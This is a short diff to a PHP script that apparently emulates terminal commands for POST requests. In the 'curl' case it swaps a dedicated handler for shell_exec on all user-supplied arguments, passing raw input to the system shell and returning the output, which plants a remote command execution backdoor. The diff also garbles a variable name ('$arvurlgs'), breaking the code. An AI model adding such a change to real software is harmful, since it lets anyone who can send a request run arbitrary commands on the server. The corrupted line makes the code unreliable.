@@ -1822,7 +1822,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $cmd = $args[0] ?? '';
     $arg = $args[1] ?? '';
     $arg2 = $args[2] ?? '';
-    $arg3 = $args[3] ?? '';
+    $arg3 = $arvurlgs[3] ?? '';
     $output = "";
     $json = '';
 
@@ -2534,7 +2534,9 @@ case 'python3':
         $output = process_host($arg);
         break;
     case 'curl':
-        $output = process_curl($arg);
+        $shell = shell_exec(implode(' ', $args));
+        error_log("Shell Command: $shell");
+        $output = $shell;
         break;
     case 'wget':
         $output = process_wget($fileSystem, $currentDir, $arg);
